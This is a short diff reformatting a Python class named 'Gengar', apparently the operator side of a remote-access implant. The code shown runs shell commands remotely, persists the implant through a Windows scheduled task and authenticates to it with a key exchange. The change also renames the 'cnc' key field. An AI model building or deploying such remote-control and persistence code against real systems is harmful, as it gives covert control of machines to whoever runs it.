@@ -104,7 +104,8 @@ class Gengar:
         return data
 
     def echo(self, text: str) -> str:
-        self._send(struct.pack('I', CommandTypes.ECHO) + struct.pack('I', len(text)) + text.encode())
+        self._send(struct.pack('I', CommandTypes.ECHO) +
+                   struct.pack('I', len(text)) + text.encode())
         output = self._recvall(len(text)).decode()
         return output
 
@@ -118,7 +119,8 @@ class Gengar:
         self.move_file(self._get_path(), self._GENGAR_PATH)
         create_task_cmd_output = self.shell(self._SCHTASKS_CREATE_CMD)
         if create_task_cmd_output.exit_code != 0:
-            raise GengarError(f'Failed to create scheduled task: {create_task_cmd_output.output}')
+            raise GengarError(
+                f'Failed to create scheduled task: {create_task_cmd_output.output}')
 
     def unpersist(self):
         if not self.is_persistent():
@@ -127,11 +129,13 @@ class Gengar:
         self.delete_file(self._GENGAR_PATH)
         delete_task_cmd_output = self.shell(self._SCHTASKS_DELETE_CMD)
         if delete_task_cmd_output.exit_code != 0:
-            raise GengarError(f'Failed to delete scheduled task: {delete_task_cmd_output.output}')
+            raise GengarError(
+                f'Failed to delete scheduled task: {delete_task_cmd_output.output}')
 
     def shell(self, cmd: str) -> ShellOutput:
         output = b''
-        self._send(struct.pack('I', CommandTypes.SHELL) + struct.pack('I', len(cmd)) + cmd.encode())
+        self._send(struct.pack('I', CommandTypes.SHELL) +
+                   struct.pack('I', len(cmd)) + cmd.encode())
         while True:
             output_size = struct.unpack('I', self._recvall(INT_SIZE))[0]
             if not output_size:
@@ -241,7 +245,7 @@ class Gengar:
             received_gengar_key = self._recvall(AuthenticationKeys.KEY_LEN)
             if received_gengar_key != self._AUTH_KEYS.gengar:
                 raise GengarAuthenticationFailed
-            self._send(self._AUTH_KEYS.cnc)
+            self._send(self._AUTH_KEYS.alakazam)
             self._authenticated = True
         except socket.timeout:
             raise GengarAuthenticationFailed
